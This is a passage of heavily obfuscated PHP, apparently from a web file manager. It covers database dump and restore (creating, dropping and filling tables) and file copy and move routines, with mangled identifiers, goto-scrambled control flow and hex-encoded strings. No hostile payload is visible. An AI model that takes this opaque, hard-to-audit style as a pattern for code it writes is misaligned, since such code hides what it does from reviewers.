$this->parseGroup(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[976]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[976]] : $fè¨‰³»õĞ[33]), $this->parseHaving(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[977]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[977]] : $fè¨‰³»õĞ[33]), $this->parseOrder(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[357]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[357]] : $fè¨‰³»õĞ[33]), $this->parseLimit(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[286]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[286]] : $fè¨‰³»õĞ[33]), $this->parseUnion(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[341]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[341]] : $fè¨‰³»õĞ[33]), $this->parseComment(!empty($aóË¾˜í‡[$fè¨‰³»õĞ[348]]) ? $aóË¾˜í‡[$fè¨‰³»õĞ[348]] : $fè¨‰³»õĞ[33])), $B·ƒÜÂ ¡·); return $B·ƒÜÂ ¡·; } public function getLastSql($aÌÜ«¤Ùƒ† = '') { return $aÌÜ«¤Ùƒ† ? $this->modelSql[$aÌÜ«¤Ùƒ†] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($B‹„â¤Ç†) { return addslashes($B‹„â¤Ç†); } public function setModel($dÕ™š³¬·„) { $this->model = $dÕ™š³¬·„; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($b²«ï‘Òß†, $a…ğìà¬Ü = '') { $this->database = $b²«ï‘Òß†; $this->type = $a…ğìà¬Ü; } public function model($aËùÇÜß¯ = '') { return new ModelBase($aËùÇÜß¯, $_SERVER[úÎü][33], $this->database); } public function db($fÎ êÄã›¸ = false) { goto D–ŒÒÆ®ÜÁ; c¿–çøò»½: if (!$cÛİ˜• ò”) { $D—Å‚÷™¶ã->execute("\143\x72\x65\141\x74\x65\x20\x64\x61\x74\x61\x62\x61\163\x65\x20\140{$dÍ‡èŠÒ«}\x60"); } $bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[890]] = $dÍ‡èŠÒ«; if ($bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[723]] == $d¼—‚½ñ¶ë[724]) { $bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[725]] .= $d¼—‚½ñ¶ë[978] . $dÍ‡èŠÒ«; } goto e× ÎÚªòğ; d¬Ï„Ü™Ò•: $this->database = $bÒÇ‰É®¢§; $D—Å‚÷™¶ã = $this->model()->db(); try { $cÛİ˜• ò” = $D—Å‚÷™¶ã->execute("\163\150\157\x77\40\144\x61\164\141\x62\141\x73\145\x73\40\x6c\151\153\x65\x20\47{$dÍ‡èŠÒ«}\47"); } catch (Exception $F“šäÉ¥Œ) { } goto c¿–çøò»½; e†õŒÑËÎÈ: $dÍ‡èŠÒ« = $bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[890]]; $bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[890]] = $d¼—‚½ñ¶ë[33]; if ($bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[723]] == $d¼—‚½ñ¶ë[724]) { $F ªµÓéè“ = $bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[725]]; $bÒÇ‰É®¢§[$d¼—‚½ñ¶ë[725]] = substr($F ªµÓéè“, 0, strrpos($F ªµÓéè“, $d¼—‚½ñ¶ë[978])); } goto d¬Ï„Ü™Ò•; e× ÎÚªòğ: $this->database = $bÒÇ‰É®¢§; $D—Å‚÷™¶ã->execute("\165\x73\145\x20\140{$dÍ‡èŠÒ«}\x60"); return $D—Å‚÷™¶ã; goto a¹’Å›áÌ…; D–ŒÒÆ®ÜÁ: $d¼—‚½ñ¶ë =& $_SERVER[úÎü]; $bÒÇ‰É®¢§ = array_change_key_case($this->database); if ($this->type == $d¼—‚½ñ¶ë[9] || !$fÎ êÄã›¸) { return $this->model()->db(); } goto e†õŒÑËÎÈ; a¹’Å›áÌ…: } public function createTable($C´ãæâ“¿, $aî»ˆº–³ = null) { $bŠÁšÎŠã® =& $_SERVER[úÎü]; if (!IO::exist($C´ãæâ“¿)) { ActionCall($bŠÁšÎŠã®[979], !0, 0); show_json(LNG($bŠÁšÎŠã®[980]), !1); } $E¶”Á÷ÌôÀ = sqlSplit(IO::getContent($C´ãæâ“¿)); foreach ($E¶”Á÷ÌôÀ as $D¥çæÁÜ“Ü) { if ($aî»ˆº–³) { $dğŠÃÖ¢· = stripos($D¥çæÁÜ“Ü, $bŠÁšÎŠã®[981]) === 0; if ($dğŠÃÖ¢·) { $aî»ˆº–³->task[$bŠÁšÎŠã®[982]] += 1; } } $this->model()->db()->execute($D¥çæÁÜ“Ü); if ($aî»ˆº–³ && $dğŠÃÖ¢·) { preg_match($bŠÁšÎŠã®[983], $D¥çæÁÜ“Ü, $aàÖğ„Ë•‹); $aî»ˆº–³->task[$bŠÁšÎŠã®[984]] = $aàÖğ„Ë•‹[1]; $aî»ˆº–³->update(1); } } $this->taskToCache($aî»ˆº–³); } public function insertTable($B®‚Öåô¬, $aã×°İ¥¨ = null) { $bƒÜŠ¢æƒ³ =& $_SERVER[úÎü]; $BŸÔ¢ùœÈÃ = $this->model()->db(); $d˜çŒ±ì§ = $aÛŒÄ½Î¸ ? array($aÛŒÄ½Î¸) : $BŸÔ¢ùœÈÃ->getTables(); foreach ($B®‚Öåô¬ as $E–ÑÁ÷Š‰) { $aÛŒÄ½Î¸ = basename($E–ÑÁ÷Š‰, $bƒÜŠ¢æƒ³[718]); if (!in_array($aÛŒÄ½Î¸, $d˜çŒ±ì§)) { continue; } if ($aã×°İ¥¨) { $aã×°İ¥¨->task[$bƒÜŠ¢æƒ³[984]] = $aÛŒÄ½Î¸; } if (get_filesize($E–ÑÁ÷Š‰) == 0) { continue; } $BÏöªõáñ = $this->sqlToDb($E–ÑÁ÷Š‰, $aã×°İ¥¨); if (!$BÏöªõáñ) { ActionCall($bƒÜŠ¢æƒ³[979], !0, 0); show_json(LNG($bƒÜŠ¢æƒ³[985]) . "\x5b{$aÛŒÄ½Î¸}\x5d", !1); } } $this->taskToCache($aã×°İ¥¨); } public function sqlFromDb($bÇÕ‚©¬·, $Aˆ”¼‹¤‚ò, $cËŠ„ù—Ô¼ = null, $fõƒÜ½¶¤È = null) { goto f‹„¬™¦×˜; E ‰Ó¢Ç: $bä¬íäÆ®ˆ = 1; $cäå™â¹£ = 500; $d¿Êçİ‹Æ = fopen($Aˆ”¼‹¤‚ò, $_SERVER[úÎü][986]); goto cŞ¼÷ÜÜ•Â; däƒ‘Ìùß‹: fclose($d¿Êçİ‹Æ); return $E„¦éºìç‹; goto eÆ·ĞĞ•‡é; cŞ¼÷ÜÜ•Â: $BÆ‘®œÕ§ã = $eçÆšéÏ‚ë->getPk(); $Eàâ‰ÚÑ = $eçÆšéÏ‚ë->getDbFields(); do { $bÍ„„§›øÉ = $eçÆšéÏ‚ë->field($Eàâ‰ÚÑ)->order($BÆ‘®œÕ§ã . $_SERVER[úÎü][987])->selectPage($cäå™â¹£, $bä¬íäÆ®ˆ); $C¸¨ëÉ”´í = isset($bÍ„„§›øÉ[$_SERVER[úÎü][358]][$_SERVER[úÎü][360]]) ? $bÍ„„§›øÉ[$_SERVER[úÎü][358]][$_SERVER[úÎü][360]] : 0; $DÏ§ĞÏÊ‘ƒ = !empty($bÍ„„§›øÉ[$_SERVER[úÎü][361]]) ? $bÍ„„§›øÉ[$_SERVER[úÎü][361]] : array(); if (!($DñÆ–ÅâŸ = count($DÏ§ĞÏÊ‘ƒ))) { break; } $Eíãº¸Š = array(); foreach ($DÏ§ĞÏÊ‘ƒ as $A†¤ã‚ßŠ) { if ($bÇÕ‚©¬· == $_SERVER[úÎü][988] && $A†¤ã‚ßŠ[$_SERVER[úÎü][29]] == $_SERVER[úÎü][989]) { $a…áí†«ˆ´ = json_decode($A†¤ã‚ßŠ[$_SERVER[úÎü][366]], !0); if ($a…áí†«ˆ´[$_SERVER[úÎü][28]] == date($_SERVER[úÎü][691]) && !$a…áí†«ˆ´[$_SERVER[úÎü][690]]) { continue; } } if ($fõƒÜ½¶¤È) { $A†¤ã‚ßŠ[$_SERVER[úÎü][75]] = "\x7b\151\x6f\x3a{$fõƒÜ½¶¤È}\175" . substr($A†¤ã‚ßŠ[$_SERVER[úÎü][75]], strlen("\x7b\151\157\x3a{$A†¤ã‚ßŠ[$_SERVER[úÎü][744]]}\175")); $A†¤ã‚ßŠ[$_SERVER[úÎü][744]] = $fõƒÜ½¶¤È; } $Eíãº¸Š[] = $_SERVER[úÎü][990] . $this->sqlEncode($A†¤ã‚ßŠ) . $_SERVER[úÎü][991]; } $d½…°‰¨Éñ = "\111\x4e\123\x45\x52\x54\40\x49\x4e\x54\117\x20\x60{$bÇÕ‚©¬·}\x60\x20\x28\x60" . implode($_SERVER[úÎü][992], $Eàâ‰ÚÑ) . $_SERVER[úÎü][993]; fwrite($d¿Êçİ‹Æ, $d½…°‰¨Éñ . implode($_SERVER[úÎü][994], $Eíãº¸Š) . $_SERVER[úÎü][67] . PHP_EOL); $bä¬íäÆ®ˆ++; $E„¦éºìç‹ += $DñÆ–ÅâŸ; if ($cËŠ„ù—Ô¼) { $cËŠ„ù—Ô¼->update($DñÆ–ÅâŸ); } } while ($bä¬íäÆ®ˆ <= $C¸¨ëÉ”´í); goto däƒ‘Ìùß‹; f‹„¬™¦×˜: if ($cËŠ„ù—Ô¼) { $cËŠ„ù—Ô¼->task[$_SERVER[úÎü][984]] = $bÇÕ‚©¬·; } $eçÆšéÏ‚ë = $this->model($bÇÕ‚©¬·); $E„¦éºìç‹ = 0; goto E ‰Ó¢Ç; eÆ·ĞĞ•‡é: } public function sqlToDb($dÓìâö´ÄÀ, $CÈñŸ§‹Šë = null) { goto câÈƒÓ¨Ê‰; eß™½¤ô: $aÏŒØ‰Œš = 500 + 1; while (!feof($EÙÈˆÚŠ)) { if ($CÈñŸ§‹Šë && $f‹ÒìĞáäÏ != 0) { $CÈñŸ§‹Šë->task[$cÃÚ¬­ó[982]] += 1; } $f‹ÒìĞáäÏ++; $Eæô½£ó— = trim(fgets($EÙÈˆÚŠ)); $Fª¸ÅÏŞÒ .= $cÃÚ¬­ó[50] . $this->sqlDecode($Eæô½£ó—, $this->type); if ($f‹ÒìĞáäÏ == $aÏŒØ‰Œš) { $Fª¸ÅÏŞÒ = rtrim(trim($Fª¸ÅÏŞÒ), $cÃÚ¬­ó[67]); if (!$EÔº½ñà×Ù->execute($Fª¸ÅÏŞÒ)) { return !1; } if ($CÈñŸ§‹Šë) { $CÈñŸ§‹Šë->update($f‹ÒìĞáäÏ - 1); } $Fª¸ÅÏŞÒ = $cÃÚ¬­ó[33]; $f‹ÒìĞáäÏ = 0; } } fclose($EÙÈˆÚŠ); goto Fïñò²¹ñÓ; Fïñò²¹ñÓ: if (trim($Fª¸ÅÏŞÒ)) { $Fª¸ÅÏŞÒ = rtrim(trim($Fª¸ÅÏŞÒ), $cÃÚ¬­ó[67]); if (!$EÔº½ñà×Ù->execute($Fª¸ÅÏŞÒ)) { return !1; } if ($CÈñŸ§‹Šë) { $CÈñŸ§‹Šë->update($f‹ÒìĞáäÏ - 1); } } return !0; goto BĞêÁ¶Á; câÈƒÓ¨Ê‰: $cÃÚ¬­ó =& $_SERVER[úÎü]; $EÔº½ñà×Ù = $this->model()->db(); $EÙÈˆÚŠ = @fopen($dÓìâö´ÄÀ, $cÃÚ¬­ó[995]); goto d»¾Ô•›Ì; d»¾Ô•›Ì: if (!$EÙÈˆÚŠ) { return !1; } $f‹ÒìĞáäÏ = 0; $Fª¸ÅÏŞÒ = $cÃÚ¬­ó[33]; goto eß™½¤ô; BĞêÁ¶Á: } public function dropTable($B×ãÅ™“‰† = null) { $Fª–ªŞ™§“ = $this->model()->db(); $cÃ¡¡¿™¬î = $B×ãÅ™“‰† ? array($B×ãÅ™“‰†) : $Fª–ªŞ™§“->getTables(); if (!$cÃ¡¡¿™¬î) { return; } foreach ($cÃ¡¡¿™¬î as $B×ãÅ™“‰†) { $Fª–ªŞ™§“->execute("\144\162\157\x70\x20\164\x61\142\154\x65\x20\151\x66\x20\x65\170\151\163\x74\x73\40\140{$B×ãÅ™“‰†}\140"); } } private function taskToCache($C„¨¥‰º = null) { $e¿ˆ¬¥µøÂ =& $_SERVER[úÎü]; if (!$C„¨¥‰º) { return; } $dÄÆŠ‹ê¬ì = array($e¿ˆ¬¥µøÂ[984] => $C„¨¥‰º->task[$e¿ˆ¬¥µøÂ[984]], $e¿ˆ¬¥µøÂ[982] => $C„¨¥‰º->task[$e¿ˆ¬¥µøÂ[982]], $e¿ˆ¬¥µøÂ[996] => $C„¨¥‰º->task[$e¿ˆ¬¥µøÂ[996]]); if ($dÄÆŠ‹ê¬ì[$e¿ˆ¬¥µøÂ[982]] == $dÄÆŠ‹ê¬ì[$e¿ˆ¬¥µøÂ[996]]) { $dÄÆŠ‹ê¬ì[$e¿ˆ¬¥µøÂ[697]] = 1; } Cache::set($e¿ˆ¬¥µøÂ[997] . $C„¨¥‰º->task[$e¿ˆ¬¥µøÂ[383]], $dÄÆŠ‹ê¬ì); $C„¨¥‰º->end(); } private function sqlEncode($B³«²é¥¸¡) { $DÑ˜è±‘ªÏ =& $_SERVER[úÎü]; $aèõë•é„Š = array(); foreach ($B³«²é¥¸¡ as $FŸî›«ƒ¿°) { if (is_array($FŸî›«ƒ¿°)) { $FŸî›«ƒ¿° = json_encode_force($FŸî›«ƒ¿°); } $FŸî›«ƒ¿° = addslashes($FŸî›«ƒ¿°); $FŸî›«ƒ¿° = str_replace(array($DÑ˜è±‘ªÏ[998], $DÑ˜è±‘ªÏ[225]), array($DÑ˜è±‘ªÏ[999], $DÑ˜è±‘ªÏ[1000]), $FŸî›«ƒ¿°); $aèõë•é„Š[] = str_replace($DÑ˜è±‘ªÏ[55], $DÑ˜è±‘ªÏ[1001], $FŸî›«ƒ¿°); } return $DÑ˜è±‘ªÏ[55] . implode($DÑ˜è±‘ªÏ[1002], $aèõë•é„Š) . $DÑ˜è±‘ªÏ[55]; } private function sqlDecode($BòƒÄ, $C¬ç¯‹œš¹) { $A˜£¤›ƒÁÌ =& $_SERVER[úÎü]; $BòƒÄ = str_replace(array($A˜£¤›ƒÁÌ[999], $A˜£¤›ƒÁÌ[1000]), array($A˜£¤›ƒÁÌ[998], $A˜£¤›ƒÁÌ[225]), $BòƒÄ); if ($C¬ç¯‹œš¹ == $A˜£¤›ƒÁÌ[9]) { $BòƒÄ = stripslashes($BòƒÄ); } return $BòƒÄ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($fÜ”‚ˆŠõ, $d±®¹ØÎƒœ) { goto C¡å‡œÁÄš; C¡å‡œÁÄš: $D‡²ôØ°™ =& $_SERVER[úÎü]; $Aß†ÂãšÚÇ = $d±®¹ØÎƒœ; $GLOBALS[$D‡²ôØ°™[1003]] = $D‡²ôØ°™[1004] . $fÜ”‚ˆŠõ; goto B»Ú­Ãâ‘; B»Ú­Ãâ‘: Hook::trigger($D‡²ôØ°™[1004] . $fÜ”‚ˆŠõ . $D‡²ôØ°™[1005], $Aß†ÂãšÚÇ); $eÁ‚çªË¿» = self::driverMake($d±®¹ØÎƒœ[0]); if (method_exists($eÁ‚çªË¿», $fÜ”‚ˆŠõ)) { $Dæ°‘Òó…Ú = @call_user_func_array(array($eÁ‚çªË¿», $fÜ”‚ˆŠõ), $d±®¹ØÎƒœ); } else { if (method_exists($eÁ‚çªË¿», $D‡²ôØ°™[1006])) { $Dæ°‘Òó…Ú = @call_user_func_array(array($eÁ‚çªË¿», $fÜ”‚ˆŠõ), $d±®¹ØÎƒœ); } else { if (method_exists(self, $fÜ”‚ˆŠõ)) { $Dæ°‘Òó…Ú = @call_user_func_array(array(self, $fÜ”‚ˆŠõ), $d±®¹ØÎƒœ); } else { $Dæ°‘Òó…Ú = call_user_func_array(array(parent, $fÜ”‚ˆŠõ), $d±®¹ØÎƒœ); } } } goto B´Øøğã£ò; B´Øøğã£ò: Hook::trigger($D‡²ôØ°™[1004] . $fÜ”‚ˆŠõ . $D‡²ôØ°™[1007], $Aß†ÂãšÚÇ, $Dæ°‘Òó…Ú); return $Dæ°‘Òó…Ú; goto f®ÔÛóÕÎ; f®ÔÛóÕÎ: } public static function init($b¿ÃİÌÇµğ) { return self::driverMake($b¿ÃİÌÇµğ); } public static function copy($CáøàÀòåù, $aö¿Ş¬‡‡Ü, $C¦ìË…îİˆ = false, $AŒî„óô‚ê = false) { return self::copyMoveStart($CáøàÀòåù, $aö¿Ş¬‡‡Ü, $C¦ìË…îİˆ, $_SERVER[úÎü][507], $AŒî„óô‚ê); } public static function move($E ³‚±ƒôô, $d¶‡Œ©â, $e—¦êÖ‰ë“ = false, $BŠç…”ê´¿ = false) { return self::copyMoveStart($E ³‚±ƒôô, $d¶‡Œ©â, $e—¦êÖ‰ë“, $_SERVER[úÎü][509], $BŠç…”ê´¿); } private static function copyMoveStart($eçÕ½“÷ê¿, $fİËéĞ¾„Î, $aŠŒ‡ÇÄä¾, $d‹ÓŸÑ¹‹¿, $cÙ¹¸»µ¤) { $aç§ãÑÜëø =& $_SERVER[úÎü]; $c¥‘¬¾óÒ„ = array($eçÕ½“÷ê¿, $fİËéĞ¾„Î, $aŠŒ‡ÇÄä¾, $cÙ¹¸»µ¤); Hook::trigger($aç§ãÑÜëø[1004] . $d‹ÓŸÑ¹‹¿ . $aç§ãÑÜëø[1005], $c¥‘¬¾óÒ„); $Cİç…Öé¶Ş = self::copyMove($eçÕ½“÷ê¿, $fİËéĞ¾„Î, $aŠŒ‡ÇÄä¾, $d‹ÓŸÑ¹‹¿, $cÙ¹¸»µ¤); Hook::trigger($aç§ãÑÜëø[1004] . $d‹ÓŸÑ¹‹¿ . $aç§ãÑÜëø[1007], $c¥‘¬¾óÒ„, $Cİç…Öé¶Ş); return $Cİç…Öé¶Ş; } public static function saveFile($A»É³¹¬ƒ, $CÈŠ†Ñ…³, $E‰ÄœÛâÚç = true) { goto FŒ¯Õİ‹ì’; AØ†øƒ£ˆ‡: $aÙƒŠ¾× = $c§ñ½ó·íØ->pathFather($CÈŠ†Ñ…³); $E—”¶È†º = !0; if (!$E‰ÄœÛâÚç && self::driverIsSame($Dµˆ¨¥Æ¨, $c§ñ½ó·íØ)) { $E—”¶È†º = !1; } goto BÆğ…ƒ÷º; BÆğ…ƒ÷º: $EÉ²Ğô°×µ = self::copyFile($Dµˆ¨¥Æ¨, $A»É³¹¬ƒ, $c§ñ½ó·íØ, $aÙƒŠ¾×, $b¨¶İÁø¾ğ[$aòÔà´³±[28]], $E—”¶È†º); if ($E¶ÉéÄ¢¢) { $EÉ²Ğô°×µ = $E¶ÉéÄ¢¢->getPathOuter($EÉ²Ğô°×µ); } return $EÉ²Ğô°×µ; goto EåƒÎá’³Í; FŒ¯Õİ‹ì’: $aòÔà´³± =& $_SERVER[úÎü]; $b¨¶İÁø¾ğ = self::info($CÈŠ†Ñ…³); $Dµˆ¨¥Æ¨ = self::driverMake($A»É³¹¬ƒ); goto bê±è•®ŠŸ; bê±è•®ŠŸ: $c§ñ½ó·íØ = self::driverMake($CÈŠ†Ñ…³); $E¶ÉéÄ¢¢ = !1; if ($c§ñ½ó·íØ->pathParse[$aòÔà´³±[1008]]) { $CÄÆˆë² = $c§ñ½ó·íØ->pathParse[$aòÔà´³±[1008]]; $E¶ÉéÄ¢¢ = $c§ñ½ó·íØ; $c§ñ½ó·íØ = self::driverMake($CÄÆˆë²); } goto AØ†øƒ£ˆ‡; EåƒÎá’³Í: } private static function copyMove($F °öØğ¶ê, $CøÉì£½®ô, $AÍÂò¨ ’º, $F»¥’ôšİì, $bé›é­‚­ = false) { goto E‡îŠ›Ñ¶Š; E‹ØÚê†¬: $b¼ø‡‡ëã” = $bø·ºÒññÀ->isFile($F °öØğ¶ê); if (!$b¼ø‡‡ëã” && $aë¬ŠñÛ†->getType() == $E¡—Áƒˆ©Š[695] && $bø·ºÒññÀ->getType() == $E¡—Áƒˆ©Š[102]) { $fÓÕ×Ì…‡ß = $aë¬ŠñÛ†->copyFolderFromIO($bø·ºÒññÀ, $F °öØğ¶ê, $CøÉì£½®ô, $AÍÂò¨ ’º, $a¡“‚¦¥ê, $bé›é­‚­); } else { $fÓÕ×Ì…‡ß = self::copyPath($bø·ºÒññÀ, $F °öØğ¶ê, $aë¬ŠñÛ†, $CøÉì£½®ô, $AÍÂò¨ ’º, $a¡“‚¦¥ê, $b¼ø‡‡ëã”, $bé›é­‚­); } if ($fÓÕ×Ì…‡ß && $a¡“‚¦¥ê) { $bø·ºÒññÀ->remove($F °öØğ¶ê); } goto C”ù×Šãí; E‡îŠ›Ñ¶Š: $E¡—Áƒˆ©Š =& $_SERVER[úÎü]; if (!$F °öØğ¶ê || $F °öØğ¶ê == $E¡—Áƒˆ©Š[8] || !$CøÉì£½®ô) { return !1; } ignore_timeout(); goto cœÔÆ øÛö; cœÔÆ øÛö: $bø·ºÒññÀ = self::driverMake($F °öØğ¶ê); $aë¬ŠñÛ† = self::driverMake($CøÉì£½®ô); $a¡“‚¦¥ê = $F»¥’ôšİì == $E¡—Áƒˆ©Š[509]; goto e×´¤¨‚•; e×´¤¨‚•: $E³ÔôõŸÙ = !1; if ($aë¬ŠñÛ†->pathParse[$E¡—Áƒˆ©Š[1008]]) { $CøÉì£½®ô = $aë¬ŠñÛ†->pathParse[$E¡—Áƒˆ©Š[1008]]; $E³ÔôõŸÙ = $aë¬ŠñÛ†; $aë¬ŠñÛ† = self::driverMake($CøÉì£½®ô); } self::check($bø·ºÒññÀ, $F °öØğ¶ê, $aë¬ŠñÛ†, $CøÉì£½®ô); goto b¿»ƒ½›ä; C”ù×Šãí: if ($E³ÔôõŸÙ) { $fÓÕ×Ì…‡ß = $E³ÔôõŸÙ->getPathOuter($fÓÕ×Ì…‡ß); } return $fÓÕ×Ì…‡ß; goto B‡øÚŒ; b¿»ƒ½›ä: Hook::trigger($E¡—Áƒˆ©Š[72], $bø·ºÒññÀ, $F °öØğ¶ê, $aë¬ŠñÛ†, $CøÉì£½®ô); $B®Œ˜ŒÂñß = self::driverIsSame($bø·ºÒññÀ, $aë¬ŠñÛ†); if ($B®Œ˜ŒÂñß) { if ($F»¥’ôšİì == $E¡—Áƒˆ©Š[509] && !method_exists($aë¬ŠñÛ†, $E¡—Áƒˆ©Š[1009]) && trim($CøÉì£½®ô, $E¡—Áƒˆ©Š[8]) == trim($aë¬ŠñÛ†->pathFather($F °öØğ¶ê), $E¡—Áƒˆ©Š[8])) { if ($bø·ºÒññÀ->pathThis($F °öØğ¶ê) != $bé›é­‚­ && !$bø·ºÒññÀ->isTypeObject()) { return $bø·ºÒññÀ->rename($F °öØğ¶ê, $bé›é­‚­); } return $aë¬ŠñÛ†->getPathOuter($F °öØğ¶ê); } if (method_exists($aë¬ŠñÛ†, $F»¥’ôšİì)) { return $aë¬ŠñÛ†->{$F»¥’ôšİì}($F °öØğ¶ê, $CøÉì£½®ô, $AÍÂò¨ ’º); } } goto E‹ØÚê†¬; B‡øÚŒ: } private static function check($b¤Ä÷ñŸ º, $F´„‰ö¿™Ô, $eÂàŒ°ÈÄÉ, &$DŠ—Š”¦) { $a•¢¹øÎŠ =& $_SERVER[úÎü]; if (self::driverIsSame($b¤Ä÷ñŸ º, $eÂàŒ°ÈÄÉ) && $b¤Ä÷ñŸ º->isFolder($F´„‰ö¿™Ô) && $b¤Ä÷ñŸ º->isParentOf($F´„‰ö¿™Ô, $DŠ—Š”¦)) { show_json(LNG($a•¢¹øÎŠ[1010]), !1); } if (!$b¤Ä÷ñŸ º->exist($F´„‰ö¿™Ô)) { show_json(LNG($a•¢¹øÎŠ[101]), !1); } } private static function copyPath($a÷ã½Ñùè†, $fÈ…ÆŠ“ŒŠ, $D†ÉÈŒ­¨, $cÄè£ä‹ÏÄ, $c·¦¼†‰ò, $eìÉ†¢ˆó, $a¬Ğ‰Ÿ¢¥Š, $aŒø™‡ì¾Á = false) { goto F¦ÛÛ›åù ; A œó¤ˆª: $BùÑ³Ü¼ = $D†ÉÈŒ­¨->mkdir($D†ÉÈŒ­¨->getPath($D©ÈÅ ¥™ª)); $cÄè£ä‹ÏÄ = $D†ÉÈŒ­¨->getPathInner($BùÑ³Ü¼); $E°ì‡×á¢‚ = $a÷ã½Ñùè†->listPath($fÈ…ÆŠ“ŒŠ, !0); goto cãğ¬‹±Ÿ; cãğ¬‹±Ÿ: $eóØ–¥Ã¸ = array_merge($E°ì‡×á¢‚[$dÂéÅŞİ[73]], $E°ì‡×á¢‚[$dÂéÅŞİ[74]]); foreach ($eóØ–¥Ã¸ as $aí„ÃóÇô) { $Aª×ö¸Ÿ¬µ = $aí„ÃóÇô[$dÂéÅŞİ[29]] == $dÂéÅŞİ[171]; $fÈ…ÆŠ“ŒŠ = $a÷ã½Ñùè†->getPathInner($aí„ÃóÇô[$dÂéÅŞİ[75]]); $e½ƒ¥Çõ±à = self::copyPath($a÷ã½Ñùè†, $fÈ…ÆŠ“ŒŠ, $D†ÉÈŒ­¨, $cÄè£ä‹ÏÄ, $c·¦¼†‰ò, $eìÉ†¢ˆó, $Aª×ö¸Ÿ¬µ); if (!$e½ƒ¥Çõ±à) { IO::errorTips($dÂéÅŞİ[1011] . $fÈ…ÆŠ“ŒŠ . $dÂéÅŞİ[66] . $cÄè£ä‹ÏÄ); } } return $BùÑ³Ü¼; goto D‚ÀÌÕ‡‡; F¦ÛÛ›åù : $dÂéÅŞİ =& $_SERVER[úÎü]; $e¯ôéŒ¦Ø« = $aŒø™‡ì¾Á ? $aŒø™‡ì¾Á : $a÷ã½Ñùè†->pathThis($fÈ…ÆŠ“ŒŠ); if ($c·¦¼†‰ò) { $AÃ£ÀêÏ¨Æ = $D†ÉÈŒ­¨->fileNameExist($cÄè£ä‹ÏÄ, $e¯ôéŒ¦Ø«); $e¯ôéŒ¦Ø« = $D†ÉÈŒ­¨->fileNameAuto($cÄè£ä‹ÏÄ, $e¯ôéŒ¦Ø«, $c·¦¼†‰ò, !$a¬Ğ‰Ÿ¢¥Š); $c·¦¼†‰ò = $AÃ£ÀêÏ¨Æ ? $c·¦¼†‰ò : !1; } goto EÙïÜÇÚÃ; EÙïÜÇÚÃ: if ($a¬Ğ‰Ÿ¢¥Š) { return self::copyFile($a÷ã½Ñùè†, $fÈ…ÆŠ“ŒŠ, $D†ÉÈŒ­¨, $cÄè£ä‹ÏÄ, $e¯ôéŒ¦Ø«, $eìÉ†¢ˆó); } if ($c·¦¼†‰ò == REPEAT_RENAME_FOLDER) { $c·¦¼†‰ò = !1; } $D©ÈÅ ¥™ª = rtrim($cÄè£ä‹ÏÄ, $dÂéÅŞİ[8]) . $dÂéÅŞİ[8] . $e¯ôéŒ¦Ø«; goto A œó¤ˆª; D‚ÀÌÕ‡‡: } private static function copyFile($b¥–¶´÷ã‹, $cî¤†ÁÊ‹³, $F‚‚õîéÖ×, $eíˆó²Ò³™, $AÎÌÇ¾‰ç, $DšÅ¦Úã·Ó) { goto f…ƒ‹ˆ—¦Ñ; EÀÜ”‘áëÁ: mk_dir($fÆæĞ¨ºªÁ); $Cá¾Éô«µ¨ = $fÆæĞ¨ºªÁ . $Bø™—ñ’ìÁ; $Cá¾Éô«µ¨ = $b¥–¶´÷ã‹->download($cî¤†ÁÊ‹³, $Cá¾Éô«µ¨); goto CÀ£–ÓÛ¿Å; e×ìÖí»¿ç: Hook::trigger($câë¾õêŠ—[1013], $b¥–¶´÷ã‹, $cî¤†ÁÊ‹³, $F‚‚õîéÖ×, $eíˆó²Ò³™, $AÎÌÇ¾‰ç, $Bø™—ñ’ìÁ); if (self::driverIsSame($b¥–¶´÷ã‹, $F‚‚õîéÖ×)) { if ($DšÅ¦Úã·Ó) { $F¢–ÄÂ˜œª = $F‚‚õîéÖ×->moveFile($cî¤†ÁÊ‹³, $eíˆó²Ò³™); } else { $F¢–ÄÂ˜œª = $F‚‚õîéÖ×->copyFile($cî¤†ÁÊ‹³, $eíˆó²Ò³™); } Hook::trigger($câë¾õêŠ—[1014], $b¥–¶´÷ã‹, $cî¤†ÁÊ‹³, $F‚‚õîéÖ×, $eíˆó²Ò³™, $AÎÌÇ¾‰ç, $F¢–ÄÂ˜œª); return $F¢–ÄÂ˜œª; } $fÆæĞ¨ºªÁ = TEMP_FILES; goto EÀÜ”‘áëÁ; CÀ£–ÓÛ¿Å: $Cá¾Éô«µ¨ = $b¥–¶´÷ã‹->iconvApp($Cá¾Éô«µ¨); $F¢–ÄÂ˜œª = $F‚‚õîéÖ×->upload($eíˆó²Ò³™, $Cá¾Éô«µ¨, $DšÅ¦Úã·Ó); self::remove($fÆæĞ¨ºªÁ . $Bø™—ñ’ìÁ); goto BÅó©‡Û²Ê; BÅó©‡Û²Ê: Hook::trigger($câë¾õêŠ—[1014], $b¥–¶´÷ã‹, $cî¤†ÁÊ‹³, $F‚‚õîéÖ×, $eíˆó²Ò³™, $AÎÌÇ¾‰ç, $F¢–ÄÂ˜œª); return $F¢–ÄÂ˜œª; goto F¿Ÿ¹¨‹Õ; f…ƒ‹ˆ—¦Ñ: $câë¾õêŠ— =& $_SERVER[úÎü]; $eíˆó²Ò³™ = $F‚‚õîéÖ×->getPath(rtrim($eíˆó²Ò³™, $câë¾õêŠ—[8]) . $câë¾õêŠ—[8] . $AÎÌÇ¾‰ç); $Bø™—ñ’ìÁ = $câë¾õêŠ—[1012] . time() . 